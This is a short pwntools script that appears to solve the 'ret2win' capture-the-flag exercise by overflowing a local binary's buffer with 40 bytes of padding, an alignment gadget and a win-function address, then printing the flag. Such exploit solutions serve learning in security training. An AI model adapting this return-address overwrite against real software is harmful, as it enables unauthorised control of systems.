from pwn import *

context.binary = ELF('./ret2win')

p = process('./ret2win')

p.recvuntil(b">")

offset = 40

payload = offset * b"A"
payload += p64(0x400755)    # Address of ret instruction to allign
payload += p64(0x400756)
print(len(payload))

with open("input.txt", "wb") as f:
    f.write(payload)

p.sendline(payload)

data = p.recvall().decode().strip()
flag = data.split("\n")[2]
print(flag)